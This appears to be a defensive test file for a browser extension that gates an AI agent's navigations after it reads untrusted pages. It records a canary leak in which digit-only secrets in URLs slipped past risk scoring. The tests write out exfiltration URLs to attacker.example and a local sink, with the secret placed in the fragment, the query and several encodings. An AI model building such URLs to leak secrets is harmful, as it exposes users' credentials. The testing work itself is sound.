// @vitest-environment jsdom
/**
 * Proof tests for the model-free check leak of 2026-11-15 (inject_tab_exfil,
 * trusted-origin posture). They FAIL on main 63a169c.
 *
 * A: the leaking run was not a taint race. Its canary, recovered from the
 *    run's start timestamp (checkId model-free-2026-11-15T09-36-59-221Z), was
 *    sk-canary-5145780562385907: sixteen decimal digits. URL-risk scoring
 *    does not count a digit-only run as data, so a correctly tainted session
 *    got ordinary cards for the three URLs carrying it verbatim.
 * B: a separate gap found while reading the taint path: a taint record with
 *    unknown sources (host lineage, lost extension record) is turned into a
 *    single-origin record by the next navigation, even a denied one, and that
 *    origin then becomes the exempt destination.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { PolicyRuntime } from '../src/background/policy-runtime.ts'
import { taintForcedReasons, type TaintRecord } from '../src/security/taint.ts'

beforeEach(() => {
  vi.stubGlobal('chrome', {
    runtime: { id: 'ext', getURL: (path: string) => `chrome-extension://ext/${path}` },
    storage: {},
  } as unknown as typeof chrome)
})
afterEach(() => { vi.unstubAllGlobals() })

const SITE = 'http://127.0.0.1:43163'
const SINK = 'http://localhost:43163'
const tainted: TaintRecord = { sources: [SITE], lastReadOrigin: SITE, firstTool: 'browser_snapshot', since: 0 }

describe('A: URL-risk false negative under taint (the observed leak)', () => {
  const canary = 'sk-canary-5145780562385907'
  const urls = {
    'open_tab / navigate, as instructed': `${SINK}/sink/landing#token=${canary}`,
    'navigate, canary as a query value': `${SINK}/sink/q?d=${canary}`,
    'navigate, percent-encoded query value': `${SINK}/sink/q?d=${[...Buffer.from(canary)].map((byte) => `%${byte.toString(16).padStart(2, '0')}`).join('')}`,
  }
  for (const [label, url] of Object.entries(urls)) {
    it(`forces a card for the leaking run's canary: ${label}`, () => {
      // Diagnosis, not the property: analyzeUrl(url).risky is false for these three on main.
      for (const name of ['browser_navigate', 'browser_open_tab']) {
        expect(taintForcedReasons({ name, args: { url } }, tainted)).not.toEqual([])
      }
    })
  }
  it('still forces the encodings that were forced in that run (control)', () => {
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: `${SINK}/sink/c/${Buffer.from(canary).toString('base64url')}` } }, tainted)).not.toEqual([])
    expect(taintForcedReasons({ name: 'browser_open_tab', args: { url: `${SINK}/sink/landing#${Buffer.from(canary).toString('hex')}` } }, tainted)).not.toEqual([])
  })
  it.each([
    'https://attacker.example/c?n=4111111111111111', // a card number
    'https://attacker.example/c?k=sk-canary-744646ca668266cc', // mixed hex, low measured entropy
    'https://attacker.example/c?k=sk-canary-9bdbdb9df9959fad',
  ])('forces a card for %s in a tainted session', (url) => {
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url } }, { ...tainted, sources: ['https://bank.example'] })).not.toEqual([])
  })
})

describe('B: an unknown source set must stay unknown', () => {
  const runtime = (): PolicyRuntime => new PolicyRuntime({
    settings: () => ({ siteRules: [], siteDefaultsEnabled: true }),
    unrestricted: () => true,
    clearBridgeTaint: vi.fn(async () => {}),
  })
  const risky = 'https://attacker.example/c?k=sk-canary-800b3920a5708f56'
  const navigate = (policy: PolicyRuntime, id: string, url: string, ok: boolean) => {
    const call = { id, name: 'browser_navigate', args: { url }, sessionId: 'child' }
    const decision = policy.hook(id, 'child', true)(call, { reads: [], acts: [], destination: url })
    policy.recordResult(call, ok)
    return decision
  }

  it('keeps forcing after the user denied the first attempt (retry of a host-tainted session)', () => {
    const policy = runtime()
    // The Host says the session is tainted; this extension has no record of its own
    // (subagent or fork of a tainted session, another browser, a restarted browser).
    policy.markHostTaint('child')
    expect(navigate(policy, 'c1', risky, false).kind).toBe('force') // the user denies
    expect(navigate(policy, 'c2', risky, false).kind).toBe('force') // the agent simply retries
  })

  it('keeps forcing after a plain navigation to the attacker origin', () => {
    const policy = runtime()
    policy.markHostTaint('child')
    expect(navigate(policy, 'c1', 'https://attacker.example/', true).kind).not.toBe('force')
    expect(navigate(policy, 'c2', risky, true).kind).toBe('force')
  })
})
